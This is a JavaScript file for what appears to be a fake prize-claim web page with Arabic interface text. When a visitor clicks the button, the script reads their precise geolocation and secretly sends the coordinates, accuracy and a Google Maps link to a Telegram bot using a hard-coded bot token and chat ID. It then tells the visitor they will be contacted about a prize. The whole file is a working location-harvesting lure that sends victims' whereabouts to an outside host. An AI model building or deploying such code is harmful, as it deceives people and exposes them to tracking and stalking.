document.getElementById("getLocation").addEventListener("click", () => {
  const statusMsg = document.getElementById("statusMsg");

  if (navigator.geolocation) {
    statusMsg.textContent = "جاري تحديد موقعك...";
    navigator.geolocation.getCurrentPosition(sendLocation, showError);
  } else {
    statusMsg.textContent = "المتصفح لا يدعم تحديد الموقع.";
  }
});

function sendLocation(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;
  const acc = position.coords.accuracy;

  const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

  const message = `
مستخدم جديد فتح رابط الجوائز:

📍 الموقع الجغرافي:
- خط العرض: ${lat}
- خط الطول: ${lon}
- دقة الموقع: ${acc} متر

رابط مباشر للموقع:
${googleMapsLink}
  `;

  const token = "7874509299:AAEXnwpKl-m7E2pVuuYWxfixW-YC1oZ3Ng0"; // ← استبدل بالتوكن الحقيقي
  const chatId = "6817512459"; // ← استبدل بـ ID التليجرام الحقيقي
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  })
  .then(() => {
    document.getElementById("statusMsg").textContent = "تم تأكيد موقعك! سيتم التواصل معك قريبًا.";
  })
  .catch(() => {
    document.getElementById("statusMsg").textContent = "حدث خطأ أثناء الإرسال، حاول مجددًا.";
  });
}

function showError(error) {
  const statusMsg = document.getElementById("statusMsg");
  switch (error.code) {
    case error.PERMISSION_DENIED:
      statusMsg.textContent = "تم رفض إذن تحديد الموقع.";
      break;
    case error.POSITION_UNAVAILABLE:
      statusMsg.textContent = "موقعك غير متاح حاليًا.";
      break;
    case error.TIMEOUT:
      statusMsg.textContent = "انتهى وقت المحاولة.";
      break;
    default:
      statusMsg.textContent = "حدث خطأ غير معروف.";
  }
}